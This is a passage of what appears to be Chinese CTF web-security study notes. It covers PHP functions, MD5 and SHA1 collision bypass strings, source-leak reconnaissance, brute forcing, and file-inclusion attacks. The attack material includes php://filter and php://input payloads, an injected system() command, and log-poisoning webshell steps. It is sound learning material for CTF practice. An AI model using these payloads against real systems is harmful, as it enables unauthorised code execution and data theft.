-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">2</span>;&#125;<span class="title function_ invoke__">phpinfo</span>();<span class="comment">/* </span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">此时代码为</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">niming</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$name</span>.编号<span class="number">2</span>;</span><br><span class="line">     &#125;<span class="title function_ invoke__">phpinfo</span>();<span class="comment">/*</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure></li>
-</ul>
-<hr>
-<h4 id="foreach函数"><a href="#foreach函数" class="headerlink" title="foreach函数"></a>foreach函数</h4><blockquote>
-<p>遍历数组</p>
-</blockquote>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (array_expression <span class="keyword">as</span> <span class="variable">$value</span>) statement</span><br><span class="line">    </span><br><span class="line"><span class="keyword">foreach</span> (array_expression <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) statement</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>当 foreach 开始执行时，数组内部的指针会自动指向第一个单元</li>
-</ul>
-<hr>
-<h4 id="mb-substr-函数"><a href="#mb-substr-函数" class="headerlink" title="mb_substr()函数"></a>mb_substr()函数</h4><blockquote>
-<p>返回字符串的一部分,如果失败则返回 FALSE，或者返回一个空字符串</p>
-<p>PHP：4+</p>
-</blockquote>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">mb_substr</span> ( <span class="keyword">string</span> <span class="variable">$str</span> , <span class="keyword">int</span> <span class="variable">$start</span> [, <span class="keyword">int</span> <span class="variable">$length</span> = <span class="literal">NULL</span> [, <span class="keyword">string</span> <span class="variable">$encoding</span> = <span class="title function_ invoke__">mb_internal_encoding</span>() ]] ) : <span class="keyword">string</span> </span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><code>encoding</code>:可选。字符编码。如果省略，则使用内部字符编码。</li>
-</ul>
-<hr>
-<h4 id="mb-strpos-函数"><a href="#mb-strpos-函数" class="headerlink" title="mb_strpos()函数"></a>mb_strpos()函数</h4><blockquote>
-<p>查找字符串在另一个字符串中首次出现的位置</p>
-<p>PHP 4 &gt;&#x3D; 4.0.6, PHP 5, PHP 7</p>
-</blockquote>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">mb_strpos</span> (haystack ,needle )</span><br><span class="line"><span class="comment">//haystack：要被检查的字符串</span></span><br><span class="line"><span class="comment">//needle：要搜索的字符串</span></span><br></pre></td></tr></table></figure>
-
-
-
-<hr>
-<h4 id="in-array-函数"><a href="#in-array-函数" class="headerlink" title="in_array()函数"></a>in_array()函数</h4><blockquote>
-<p>判断一个值是否在数组中</p>
-</blockquote>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">in_array</span>(value,<span class="keyword">array</span>,type)</span><br><span class="line"><span class="comment">//value ：要搜索的值</span></span><br><span class="line"><span class="comment">//array ：被搜索的数组</span></span><br><span class="line"><span class="comment">//type ： 类型，true全等 ，false非全等(默认)</span></span><br></pre></td></tr></table></figure>
-
-
-
-<hr>
-<h4 id="strstr-函数"><a href="#strstr-函数" class="headerlink" title="strstr()函数"></a>strstr()函数</h4><blockquote>
-<p>判断字符串str2是否是str1的子串。如果是，则该函数返回 str1字符串从 str2第一次出现的位置开始到 str1结尾的字符串；否则，返回NULL。(搜索字符串在另一个字符串出现的位置，)</p>
-<p>PHP3，PHP4，PHP5</p>
-</blockquote>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">strstr</span>(str1,str2)</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>该函数区分大小写，不区分的可用<code>stristr()</code></li>
-</ul>
-<hr>
-<h4 id="str-ireplace-函数"><a href="#str-ireplace-函数" class="headerlink" title="str_ireplace()函数"></a>str_ireplace()函数</h4><blockquote>
-<p>替换字符串中的一些字符（不区分大小写）</p>
-<p>PHP5+</p>
-</blockquote>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">str_ireplace</span>(find,replace,<span class="keyword">string</span>,count) </span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>可使用<code>str_replace()</code>函数执行区分大小写</li>
-</ul>
-<hr>
-<h4 id="类"><a href="#类" class="headerlink" title="类"></a>类</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">类名::方法名</span><br><span class="line"><span class="comment">//调用此类的方法</span></span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<p><a target="_blank" rel="noopener" href="https://www.runoob.com/linux/linux-command-manual.html">Linux命令</a></p>
-<h3 id="javascript"><a href="#javascript" class="headerlink" title="javascript"></a><a target="_blank" rel="noopener" href="https://www.runoob.com/js/js-tutorial.html">javascript</a></h3><h4 id="btoa-amp-atob"><a href="#btoa-amp-atob" class="headerlink" title="btoa()&amp;atob()"></a>btoa()&amp;atob()</h4><blockquote>
-<p>前者创建一个 base-64 编码的字符串，后者是解码</p>
-</blockquote>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> enc = <span class="variable language_">window</span>.<span class="title function_">btoa</span>(str);</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h3 id="编码方式"><a href="#编码方式" class="headerlink" title="编码方式"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/RuoLi_s/article/details/109767829?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167448358816800215059313%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167448358816800215059313&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-109767829-null-null.142%5Ev71%5Einsert_chatgpt,201%5Ev4%5Eadd_ask&utm_term=ctf%E5%B8%B8%E8%A7%81%E7%BC%96%E7%A0%81&spm=1018.2226.3001.4187">编码方式</a></h3><h4 id="敲击码-Tap-code"><a href="#敲击码-Tap-code" class="headerlink" title="敲击码(Tap code)"></a><a target="_blank" rel="noopener" href="http://www.hiencode.com/tapcode.html">敲击码(Tap code)</a></h4><h3 id="md5等效值绕过"><a href="#md5等效值绕过" class="headerlink" title="md5等效值绕过"></a>md5等效值绕过</h3><ul>
-<li><p>弱类型绕过</p>
-<ul>
-<li><p>以0e开头的数字后面会被忽略（科学计数法）、</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line"></span><br><span class="line">240610708</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>数组绕过</p>
-<p>原理是<strong>md5等函数不能处理数组，导致函数返回Null</strong>。而Null是等于Null的，导致了绕过。</p>
-</li>
-</ul>
-</li>
-<li><p>强类型绕过</p>
-<p>用MD值完全相同的字符来进行绕过</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%24%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%82%7D%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%84%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEcC%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%BC%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%99%B59%F9%FF%C2</span><br><span class="line"></span><br><span class="line">psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%A4%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%02%7E%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%04%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEc%C3%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%3C%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%9959%F9%FF%C2</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>自身和md5后都是0e开头</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0e215962017</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h3 id="SHA1碰撞"><a href="#SHA1碰撞" class="headerlink" title="SHA1碰撞"></a>SHA1碰撞</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array1=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;array2=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</span><br></pre></td></tr></table></figure>
-
-
-
-<hr>
-<h3 id="绕waf"><a href="#绕waf" class="headerlink" title="绕waf"></a>绕waf</h3><h4 id="限制长度"><a href="#限制长度" class="headerlink" title="限制长度"></a>限制长度</h4><p>添加脏数据：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=1&amp;1=1&amp;1=1&amp;</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h1 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h1><h2 id="数据泄露"><a href="#数据泄露" class="headerlink" title="数据泄露"></a>数据泄露</h2><h3 id="Kali扫描"><a href="#Kali扫描" class="headerlink" title="Kali扫描"></a>Kali扫描</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u url</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="GitHack"><a href="#GitHack" class="headerlink" title="GitHack"></a>GitHack</h3><p>GitHack是一个.git泄露利用脚本，通过泄露的.git文件夹下的文件，重建还原工程源代码。<br>渗透测试人员、攻击者，可以进一步审计代码，挖掘：文件上传，SQL注射等web安全漏洞。</p>
-<p>在安装文件夹下打开终端</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python GitHack.py url/.git</span><br></pre></td></tr></table></figure>
-
-
-
-<hr>
-<h3 id="版本控制泄露"><a href="#版本控制泄露" class="headerlink" title="版本控制泄露"></a>版本控制泄露</h3><ul>
-<li><p>.git泄露:访问url&#x2F;.git&#x2F;</p>
-</li>
-<li><p>.svn泄露:访问url&#x2F;.svn&#x2F;</p>
-</li>
-</ul>
-<h3 id="robots后台泄露"><a href="#robots后台泄露" class="headerlink" title="robots后台泄露"></a>robots后台泄露</h3><p>  访问url&#x2F;robots.txt</p>
-<p>  标志：disallow</p>
-<h3 id="phps源码泄露"><a href="#phps源码泄露" class="headerlink" title="phps源码泄露"></a>phps源码泄露</h3><p>  访问index.phps下载备份文件</p>
-<p>  或index.php.bak下载备份文件</p>
-<h3 id="源码压缩包泄露"><a href="#源码压缩包泄露" class="headerlink" title="源码压缩包泄露"></a>源码压缩包泄露</h3><p>  访问<a target="_blank" rel="noopener" href="http://www.zip下载源码/">www.zip下载源码</a></p>
-<h3 id="vim临时文件泄露"><a href="#vim临时文件泄露" class="headerlink" title="vim临时文件泄露"></a>vim临时文件泄露</h3><blockquote>
-<p>vim是linux自带且常用的文件编辑器<br>vim在编辑时会生成一个隐藏的临时文件<br>当vim非正常关闭时这个文件就会被保留下来</p>
-</blockquote>
-<p>  访问index.php(编辑的文件名).swp</p>
-<h3 id="域名txt记录泄露"><a href="#域名txt记录泄露" class="headerlink" title="域名txt记录泄露"></a>域名txt记录泄露</h3><p>  <a target="_blank" rel="noopener" href="http://www.jsons.cn/nslookup/">在线域名解析</a></p>
-<h3 id="敏感信息公布"><a href="#敏感信息公布" class="headerlink" title="敏感信息公布"></a>敏感信息公布</h3><p>  网页模板中加后缀<code>/admin/</code>可出现登录窗口</p>
-<blockquote>
-<p>有时候网站上的公开信息，就是管理员常用密码</p>
-</blockquote>
-<h3 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h3><p>  在HTML中藏信息，需要用注释符&lt;!–</p>
-<hr>
-<h3 id="前端js信息搜集"><a href="#前端js信息搜集" class="headerlink" title="前端js信息搜集"></a>前端js信息搜集</h3><p>  查看js代码</p>
-<p>  <code>\x</code>是js中十六进制编码的数据</p>
-<p>  使用控制台修改前端数据</p>
-<hr>
-<h3 id="web前端应用"><a href="#web前端应用" class="headerlink" title="web前端应用"></a>web前端应用</h3><p>  改前端代码字段即可</p>
-<hr>
-<h2 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h2><h3 id="BurpSuite爆破"><a href="#BurpSuite爆破" class="headerlink" title="BurpSuite爆破"></a>BurpSuite爆破</h3><p>拦截请求并发送到攻击器中</p>
-<ul>
-<li>选择需要爆破的payload位置</li>
-<li>选择payload字典，若有需要还要选择payload处理方式与编码<ul>
-<li>Palyload Encoding编码 进行base64加密的时候在最后可能存在 &#x3D;&#x3D; 这样就会影响base64 加密的结果</li>
-</ul>
-</li>
-</ul>
-<hr>
-<h3 id="域名爆破"><a href="#域名爆破" class="headerlink" title="域名爆破"></a>域名爆破</h3><p><a href="http://www.virustotal.com:免费的可疑文件分析的网站">www.virustotal.com:免费的可疑文件分析的网站</a></p>
-<hr>
-<h3 id="条件爆破"><a href="#条件爆破" class="headerlink" title="条件爆破"></a>条件爆破</h3><p>PHP，Python</p>
-<p>根据题目条件编写脚本</p>
-<h3 id="随机数种子爆破"><a href="#随机数种子爆破" class="headerlink" title="随机数种子爆破"></a>随机数种子爆破</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(种子);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>());		<span class="comment">//根据题目条件修改</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="伪随机数爆破"><a href="#伪随机数爆破" class="headerlink" title="伪随机数爆破"></a>伪随机数爆破</h3><p>在kali上使用php_mt_seed-4.0(注意种子的php版本)</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">time ./php_mt_seed 第一次随机数</span><br></pre></td></tr></table></figure>
-
-
-
-<hr>
-<h2 id="http请求"><a href="#http请求" class="headerlink" title="http请求"></a>http请求</h2><ul>
-<li><p>本地请求(放在user-agent头后)</p>
-<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For:127.0.0.1</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>发送json请求</p>
-<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;admin&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="number">114514</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>nikto工具</p>
-<blockquote>
-<p>开源的（GPL）网页服务器扫描器</p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nikto -host ip/url</span><br><span class="line">扫描</span><br></pre></td></tr></table></figure>
-
-
-</li>
-<li><p>PUT请求</p>
-<p>put请求与post一样都会改变服务器的数据，但是put的侧重点在于对于数据的修改操作，但是post侧重于对于数据的增加</p>
-<p>可以创建文件（POST请求也可以）</p>
-</li>
-</ul>
-<hr>
-<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45794666/article/details/111713495">文件包含</a></h2><hr>
-<h3 id="前置-1"><a href="#前置-1" class="headerlink" title="前置"></a>前置</h3><h4 id="PHP相关函数"><a href="#PHP相关函数" class="headerlink" title="PHP相关函数"></a>PHP相关函数</h4><p><code>include()</code>:包含一个文件，如错误则抛出警告</p>
-<p><code>include_once()</code>:包含一个文件仅一次，和上面类似</p>
-<p><code>require()</code>:包含一个文件，如错误则报错并停止脚本</p>
-<p><code>require_once()</code>:包含一个文件仅一次，和上面类似</p>
-<p>注：<strong>任何类型</strong>的文件，只要其中含有合法PHP代码，PHP就可以包含并执行；如果没有，就会以纯文本形式显示文件中的内容</p>
-<hr>
-<h4 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000018991087">php伪协议</a></h4><p><strong>php.ini配置文件参数：</strong></p>
-<p><code>allow_url_fopen：on </code>#默认开启 ，表示允许url里的封装协议访问文件；</p>
-<p><code>allow_url_include：off</code> #默认关闭，表示不允许包含url里的封装协议包含文件；</p>
-<ul>
-<li><p><em><strong>php:&#x2F;&#x2F;协议</strong></em></p>
-<ul>
-<li><p><strong>条件</strong>：</p>
-<p><code>allow_url_fopen</code>:off&#x2F;on</p>
-<p><code>allow_url_include</code> :仅<code>php://input php://stdin php://memory php://temp </code>需要on</p>
-</li>
-<li><p><strong>php:&#x2F;&#x2F;filter</strong></p>
-<p><strong>读取文件源码</strong>可以直接用resource读取(常用)</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//base64编码</span></span><br><span class="line">php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br><span class="line"><span class="comment">//quoted-printable编码</span></span><br><span class="line">php:<span class="comment">//filter/read=convert.quoted-printable-encode/resource=flag.php</span></span><br><span class="line"><span class="comment">//rot13变换</span></span><br><span class="line">php:<span class="comment">//filter/read=string.rot13/resource=flag.php</span></span><br></pre></td></tr></table></figure></li>
-</ul>
-</li>
-</ul>
-<p>​    </p>
-<ul>
-<li><p><strong>php:&#x2F;&#x2F;input</strong></p>
-<p>执行php代码</p>
-<p>是个可以访问请求的原始数据的只读流。（php:&#x2F;&#x2F;input可以读取没有处理过的<strong>POST数据</strong>）</p>
-<p>在<code>enctype=&quot;multipart/form-data&quot;</code> 的时候<code>php://input </code>是无效的。</p>
-<ul>
-<li>利用条件：<code>绕过file_get_contents()</code></li>
-</ul>
-</li>
-<li><p><em><strong>data:&#x2F;&#x2F;协议</strong></em></p>
-<p>访问数据流，执行相应php代码</p>
-</li>
-</ul>
-<p>​		<code>data://text/plain(;base64),编码后数据</code></p>
-<ul>
-<li><p><em><strong>file:&#x2F;&#x2F;协议</strong></em></p>
-<p><strong>条件</strong>：</p>
-<ul>
-<li><code>allow_url_fopen</code>:off&#x2F;on</li>
-<li><code>allow_url_include</code> :off&#x2F;on</li>
-</ul>
-</li>
-</ul>
-<p>​		<strong>可读取本地文件</strong></p>
-<hr>
-<h4 id="Apache日志文件"><a href="#Apache日志文件" class="headerlink" title="Apache日志文件"></a>Apache日志文件</h4><ul>
-<li><p><strong>access.log</strong></p>
-<p>记录网站的访问信息</p>
-<p><code>客户端IP - - [访问时间] &quot;请求记录&quot; HTTP状态码 字节数</code></p>
-</li>
-<li><p><strong>error.log</strong></p>
-<p>记录错误的访问信息</p>
-</li>
-</ul>
-<blockquote>
-<p>注：每次的日志会记录，所以，上传命令之后，如果产生报错或者不执行的情况必须重启容器。  </p>
-<p>再就是可能会有人问为什么发送第二次包的时候才会出现flag。这是因为发送第一个包的时候，将一句话木马写入access.log日志</p>
-<p>第二次发包才包含到前一次的日志中的木马。</p>
-</blockquote>
-<hr>
-<h3 id="本地文件包含漏洞（LFI）"><a href="#本地文件包含漏洞（LFI）" class="headerlink" title="本地文件包含漏洞（LFI）"></a>本地文件包含漏洞（LFI）</h3><p><code>url+参数=挂马文件地址</code></p>
-<h4 id="Apache日志包含漏洞-目录穿越"><a href="#Apache日志包含漏洞-目录穿越" class="headerlink" title="Apache日志包含漏洞+目录穿越"></a>Apache日志包含漏洞+目录穿越</h4><ul>
-<li>使用BurpSuite发送请求，在UA头写入一句话木马，然后就可以include到当前php文件中，实现命令执行，把PHP一句话写进access.log里</li>
-<li><code>../</code>返回上级目录，可以读取上级目录的access.log文件</li>
-</ul>
-<blockquote>
-<p>注：如果不知道日志文件的地址，可以把参数设置成一个不存在的文件名，比如<code>?jumpTo=114514</code>，这样网页会报错显示网站的绝对路径  （如果没有屏蔽报错），使用了各种面板的会显示面板的错误信息，可以以此来判断日志路径。</p>
-</blockquote>
-<hr>
-<h4 id="截断攻击"><a href="#截断攻击" class="headerlink" title="截断攻击"></a>截断攻击</h4><blockquote>
-<p>PHP &lt; 5.3.4</p>
-</blockquote>
-<ul>
-<li>场景：对传入的参数使用字符串拼接</li>
-<li>在ASCII字符集中，<code>%00</code>代表的是<strong>字符串的结束</strong>，也就是说，如果在一串字符的中间插入<code>%00</code>，那么后面的字符串会被丢弃。如果把参数值改为<code>shell.jpg%00</code>，那么之后拼接的字符串将被<code>include</code>方法所丢弃。这样就能成功访问一句话木马。</li>
-</ul>
-<hr>
-<h3 id="远程文件包含漏洞（RFI）"><a href="#远程文件包含漏洞（RFI）" class="headerlink" title="远程文件包含漏洞（RFI）"></a>远程文件包含漏洞（RFI）</h3><p>本质是使用<strong>PHP伪协议</strong>进行包含</p>
-<ul>
-<li><p>无限制：参数之后加上危险脚本的URL</p>
-</li>
-<li><p>有限制时截断：</p>
-<ul>
-<li>使用<code>?</code>绕过，<strong>问号之后的字符串会被当做查询参数丢弃</strong></li>
-<li>使用<code>%20</code>绕过</li>
-</ul>
-</li>
-<li><p>伪协议php:&#x2F;&#x2F;input控制输出流：（BurpSuite）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET /file_include/index.php?jumpTo=php://input HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">......</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line"></span><br><span class="line">&lt;?php system(&quot;ipconfig/all&quot;); ?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>此时把显示主机IP地址信息的命令“输入”到了PHP中</p>
-</li>
-</ul>
-<hr>
-<h3 id="日志文件include"><a href="#日志文件include" class="headerlink" title="日志文件include"></a>日志文件include</h3><p>原理：对网站进行访问时,日志文件会记录相关信息(请求头中的信息)</p>
-<p>前提：知道日志文件所在,并能进行包含</p>
-<ul>
-<li>先访问网站在请求头中写入一句话(一般写在user-agent中)</li>
-<li>然后通过post去尝试执行</li>
-<li>执行成功后通过蚁剑连接得到shell</li>
-</ul>
-<hr>
-<h3 id="Session文件包含"><a href="#Session文件包含" class="headerlink" title="Session文件包含"></a>Session文件包含</h3><p>通过向session传入恶意代码并访问其文件实现</p>
-<h4 id="session工作原理"><a href="#session工作原理" class="headerlink" title="session工作原理"></a>session工作原理</h4><p>（1）首先使用<code>session_start()</code>函数进行初始化。</p>
-<p>（2）当执行PHP脚本时，通过使用<strong>SESSION超全局变量</strong>注册session变量。</p>
-<p>（3）当PHP脚本执行结束时，未被销毁的session变量会被自动保存在本地一定路径下的session库中，这个路径可以通过php.ini文件中的session.savepath指定，下次浏览网页时可以加载使用。</p>
-<ul>
-<li><p><strong>session_start()</strong></p>
-<p>（1）读取名为<strong>PHPSESSID</strong>（如果没有改变默认值）的cookie值，假使为abc123。</p>
-<p>（2）若读取到PHPSESSID这个COOKIE，创建SESSION变量，并从相应的目录中（可以在php.ini中设置）读取SESSabc123（默认是这种命名方式）文件，将字符装在入SESSION变量中；</p>
-<p>（3）若没有读取到PHPSESSID这个COOKIE，也会创建SESSION超全局变量注册session变量。同时创建一个sess_abc321(名称为随机值)的session文件，同时将abc321作为PHPSESSID的cookie值返回给浏览器端。</p>
-</li>
-</ul>
-<h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><blockquote>
-<p>Session Support :enable</p>
-</blockquote>
-<ul>
-<li><p><strong>session.auto_start</strong>：如果 <code>session.auto_start=On </code>，则PHP在接收请求的时候会自动初始化 Session，不再需要执行session_start()。但默认情况下，这个选项都是关闭的。</p>
-<p>但session还有一个默认选项，<code>session.use_strict_mode</code>默认值为 off。此时用户是可以自己定义 Session ID 的。</p>
-<p>比如，我们在 Cookie 里设置 PHPSESSID&#x3D;a ，PHP 将会在服务器上创建一个文件：&#x2F;tmp&#x2F;sess_a”。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值有ini.get(“session.upload_progress.prefix”)+由我们构造的 session.upload_progress.name 值组成，最后被写入 sess_ 文件里。</p>
-</li>
-<li><p><strong>session.save_path</strong>：负责 session 文件的存放位置，后面文件包含的时候需要知道恶意文件的位置，如果没有配置则不会生成session文件</p>
-</li>
-<li><p><strong>session.upload_progress_enabled</strong>：当这个配置为 On 时，代表 session.upload_progress 功能开始，如果这个选项关闭，则这个方法用不了</p>
-</li>
-<li><p><strong>session.upload_progress_cleanup</strong>：这个选项默认也是 On，也就是说当文件上传结束时，session 文件中有关上传进度的信息立马就会被删除掉；这里就给我们的操作造成了很大的困难，我们就只能使用<strong>条件竞争</strong>的方式不停的发包，争取在它被删除掉之前就成功利用</p>
-</li>
